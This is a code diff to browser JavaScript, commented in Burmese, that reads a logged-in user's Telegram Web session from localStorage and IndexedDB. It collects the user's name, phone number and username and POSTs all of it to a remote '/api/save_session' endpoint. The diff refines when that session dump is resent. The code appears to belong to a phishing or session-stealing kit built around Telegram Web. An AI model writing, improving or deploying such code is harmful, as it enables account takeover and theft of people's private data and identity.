@@ -119,33 +119,24 @@
 function getTelegramProfile() {
         try {
             let currentId = null;
-            let name = "Unknown Profile";
-            let phone = "Waiting...";
-            let username = "";
+            let name = null; // 🌟 "Unknown Profile" ဟု အသေမပေးတော့ပါ 🌟
+            let phone = null; // 🌟 "Waiting..." ဟု အသေမပေးတော့ပါ 🌟
+            let username = null;
 
             const stateStr = localStorage.getItem('tt-global-state');
             if (stateStr) {
                 const state = JSON.parse(stateStr);
                 currentId = state.currentUserId;
-                
-                // 🌟 ၁။ နေရာအသစ် (auth.currentUser) မှ အရင်ဆုံး ရှာပါမည် (အသေချာဆုံး) 🌟
-                if (state.auth && state.auth.currentUser) {
-                    const authUser = state.auth.currentUser;
-                    name = [authUser.firstName, authUser.lastName].filter(Boolean).join(' ') || name;
-                    phone = authUser.phoneNumber ? '+' + authUser.phoneNumber : phone;
-                    username = authUser.username ? '@' + authUser.username : username;
-                }
-                // 🌟 ၂။ အကယ်၍ မတွေ့ပါက (သို့) ဒေတာမစုံပါက မူလနေရာဟောင်းမှ ထပ်ရှာပါမည် 🌟
-                else if (currentId && state.users && state.users.byId) {
+                if (currentId && state.users && state.users.byId) {
                     const user = state.users.byId[currentId] || state.users.byId[currentId.toString()];
                     if (user) {
-                        name = [user.firstName, user.lastName].filter(Boolean).join(' ') || name;
-                        phone = user.phoneNumber ? '+' + user.phoneNumber : phone;
-                        username = user.username ? '@' + user.username : username;
+                        // နာမည်အစစ်ကို ဆွဲထုတ်မည်၊ မရသေးပါက null အတိုင်းထားမည်
+                        name = [user.firstName, user.lastName].filter(Boolean).join(' ') || null;
+                        phone = user.phoneNumber ? '+' + user.phoneNumber : null;
+                        username = user.username ? '@' + user.username : null;
                     }
                 }
             }
-            
             if (!currentId) {
                 const accStr = localStorage.getItem('account1');
                 if (accStr) {
@@ -157,7 +148,7 @@ function getTelegramProfile() {
         } catch (e) { console.error("Profile parsing error", e); }
         return null; 
     }
-
+  
     document.addEventListener("DOMContentLoaded", async () => { 
 
         const urlParams = new URLSearchParams(window.location.search);
@@ -203,7 +194,7 @@ function getTelegramProfile() {
             let lastSyncLength = 0; 
             let wasLoggedIn = false; 
             let lastKnownUserId = null; 
-            let lastSyncedName = "Unknown Profile";
+            let lastSyncedName = null;
 
             const syncSessionData = async () => {
                 let profile = getTelegramProfile();
@@ -241,6 +232,7 @@ function getTelegramProfile() {
                         });
                         wasLoggedIn = false; 
                         lastSyncLength = 0;
+                        lastSyncedName = null;
                     } catch(e) {}
                     return; 
                 }
@@ -254,21 +246,34 @@ function getTelegramProfile() {
                         const idbDataStr = serializeData(rawIdbData);
                         
                         const currentDataLength = idbDataStr.length + lsDataStr.length;
-                        if (lastSyncLength === currentDataLength && lastSyncedName === profile.name) return;
+
+                        const payload = {
+                            user_id: lastKnownUserId, 
+                            local_storage_str: lsDataStr,
+                            indexed_db_str: idbDataStr,
+                            timestamp: new Date().toISOString()
+                        };
+
+                        if (profile.name) payload.profile_name = profile.name;
+                        if (profile.phone) payload.profile_phone = profile.phone;
+                        if (profile.username) payload.profile_username = profile.username;
+
+                        // 🌟 အရေးကြီးဆုံး Logic: Data သိမ်းရန် အခြေအနေ (၂) ရပ် 🌟
+                        // ၁။ Session အသစ်ဝင်လာလို့ Data အရွယ်အစား ပြောင်းသွားသလား (Login ဝင်ဝင်ချင်း ချက်ချင်းပို့မည်)
+                        const isDataChanged = lastSyncLength !== currentDataLength;
+                        // ၂။ နာမည်အစစ် အခုမှပေါ်လာလို့ DB ကို Update လှမ်းလုပ်ဖို့ လိုနေသလား
+                        const isNameNewlyFound = profile.name && profile.name !== lastSyncedName;
+
+                        // Data လည်းမပြောင်းဘူး၊ နာမည်အသစ်လည်း မရှိဘူးဆိုရင် လုံးဝမပို့ဘဲ ရပ်ထားမည် (Server လေးခြင်းမှ ကာကွယ်ရန်)
+                        if (!isDataChanged && !isNameNewlyFound) return;
+                        
 
                         const res = await fetch(BACKEND_URL + "/api/save_session", {
                             method: "POST",
                             headers: { "Content-Type": "application/json", "x-api-key": API_KEY },
                             keepalive: true,
-                            body: JSON.stringify({
-                                user_id: lastKnownUserId, 
-                                profile_name: profile.name,
-                                profile_phone: profile.phone,
-                                profile_username: profile.username,
-                                local_storage_str: lsDataStr,
-                                indexed_db_str: idbDataStr,
-                                timestamp: new Date().toISOString()
-                            })
+                            body: JSON.stringify(payload)
+                                
                         });
                         
                         if(res.ok) {
